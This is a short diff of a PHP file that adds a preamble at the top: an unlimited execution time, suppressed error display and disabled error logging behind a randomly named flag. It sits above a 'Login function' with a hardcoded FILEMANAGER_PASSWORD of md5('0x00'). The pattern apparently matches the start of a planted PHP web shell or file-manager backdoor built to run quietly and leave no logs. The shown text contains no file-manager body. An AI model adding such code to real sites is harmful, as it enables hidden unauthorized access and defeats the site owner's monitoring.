@@ -1,5 +1,17 @@
 <?php
-
+@set_time_limit(0);
+@ini_set('html_errors', '0');
+@clearstatcache();
+$d_17b31f50 = false;
+if ($d_17b31f50) {
+    error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
+    @ini_set('display_errors', '1');
+    @ini_set('log_errors', '1'); 
+} else {
+    error_reporting(0);
+    @ini_set('display_errors', '0');
+    @ini_set('log_errors', '0');
+}
 /**
 Login function
 define('FILEMANAGER_PASSWORD', md5('0x00'));
